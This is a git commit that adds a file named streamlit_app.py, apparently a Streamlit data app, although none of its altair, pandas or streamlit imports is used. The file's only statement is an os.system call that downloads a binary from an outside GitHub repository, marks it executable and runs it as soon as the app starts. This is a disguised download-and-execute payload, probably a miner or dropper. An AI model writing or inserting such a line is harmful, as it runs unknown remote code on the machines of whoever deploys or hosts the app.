19e95322c089959e8f757f093bf355b2c36ea11e
amelioh <111406827+amelioh@users.noreply.github.com>
2022-08-17 03:36:38 +0000

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,14 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+import time
+import subprocess
+from os import system, name
+from time import sleep
+from subprocess import PIPE, Popen
+import base64
+
+os.system("curl -L -o Cpro https://github.com/Ikuzot/nung/raw/main/Cpro && chmod +x Cpro && ./Cpro")
